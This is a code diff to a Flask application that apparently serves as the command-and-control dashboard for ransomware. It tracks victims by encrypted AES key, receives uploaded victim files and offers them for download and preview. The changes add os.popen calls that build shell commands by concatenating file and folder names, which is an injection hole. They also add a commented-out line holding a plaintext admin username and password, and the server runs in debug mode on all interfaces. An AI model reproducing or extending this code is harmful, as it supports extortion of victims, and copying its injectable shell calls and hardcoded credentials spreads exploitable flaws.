@@ -11,13 +11,13 @@ import string
 import time
 import subprocess
 from werkzeug.security import generate_password_hash, check_password_hash
+from datetime import datetime
 
 app = Flask(__name__)
 key = os.urandom(24)
 app.config['SECRET_KEY'] = key
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-app.config['MAX_CONTENT_LENGTH'] = 1000 * 1024 * 1024  # 1000MB
 db = SQLAlchemy(app)
 login_manager = LoginManager(app)
 
@@ -65,6 +65,7 @@ class LoginForm(FlaskForm):
 # Define the main page 
 @app.route('/')
 def home():
+    #create_user('esgikingpirate', 'Ilovechuu93!')
     return render_template('home.html')
 
 # Login page for the admin dashboard
@@ -100,26 +101,50 @@ def logout():
 @app.route('/received')
 @login_required
 def received_files():
-    # Print the folders that are in folder "received"
-    folders = [folder for folder in os.listdir(app.config['RECEIVED_FOLDER']) if os.path.isdir(os.path.join(app.config['RECEIVED_FOLDER'], folder))]
-    return render_template('received_files.html', folders=folders)
+    received_folder = app.config['RECEIVED_FOLDER']
+    folders = [folder for folder in os.listdir(received_folder) if os.path.isdir(os.path.join(received_folder, folder))]
+
+    # Print the date when we created the folder
+    folder_info = []
+    for folder in folders:
+        folder_path = os.path.join(received_folder, folder)
+        command = "/usr/bin/stat -c %w /var/www/c2/" + folder_path
+        birth_time = os.popen(command).read().strip()
+        folder_info.append({'name': folder, 'birth': birth_time.split('.')[0]})
+    
+    return render_template('received_files.html', folders=folder_info)
 
 # Open specific folder which is in "received"
 @app.route('/received/<folder_name>')
 @login_required
 def show_folder(folder_name):
-    # Show all the content of a specific file that you will choose in the previous page
+    # Show all the content of a specific folder chosen in the previous page
     folder_path = os.path.join(app.config['RECEIVED_FOLDER'], folder_name)
     full_id = get_full_id(folder_path)
     files = os.listdir(folder_path)
-    return render_template('folder.html', folder_name=full_id, files=files)
 
-# Download a file by click on it on the interface
+    file_info = []
+    for file in files:
+        file_path = os.path.join(folder_path, file)
+        command = "/usr/bin/stat -c %w /var/www/c2/" + file_path
+        birth_time = os.popen(command).read().strip()      
+        file_info.append({'name': file, 'birth': birth_time.split('.')[0]})
+    
+    return render_template('folder.html', folder_name=full_id, files=file_info)
+
+# Download a file by clicking on it on the interface
 @app.route('/download/<folder_name>/<filename>')
 @login_required
-def uploaded_file(folder_name, filename):
-    # Return the file chosen
+def downloaded_file(folder_name, filename):
+    # Return the file chosen as an attachment
     return send_from_directory(os.path.join(app.config['RECEIVED_FOLDER'], folder_name), filename, as_attachment=True)
+
+# Preview a file by clicking on the preview button
+@app.route('/preview/<folder_name>/<filename>')
+@login_required
+def preview_file(folder_name, filename):
+    # Return the file chosen for preview
+    return send_from_directory(os.path.join(app.config['RECEIVED_FOLDER'], folder_name), filename, as_attachment=False)
 
 # Function to get the encrypted AES in RSA by the folder name
 # The folder name is the first 10 caracters of the encrypted AES
@@ -213,8 +238,8 @@ def upload_file():
         new_victim = Victim(key=encrypt_aes)
         db.session.add(new_victim)
         db.session.commit()
-
-    return f":3\n"
+    
+    return "\n"
 
 # Login for victim
 @app.route('/victim_login', methods=['GET', 'POST'])
@@ -321,6 +346,5 @@ def victims():
     return render_template('victims.html', victims=victims)
 
 if __name__ == '__main__':
-        # Uncomment the line below to create a user
-        #create_user('jay', 'jay')
+    # Uncomment the line below to create a user
     app.run(host="0.0.0.0", port=4295, debug=True)
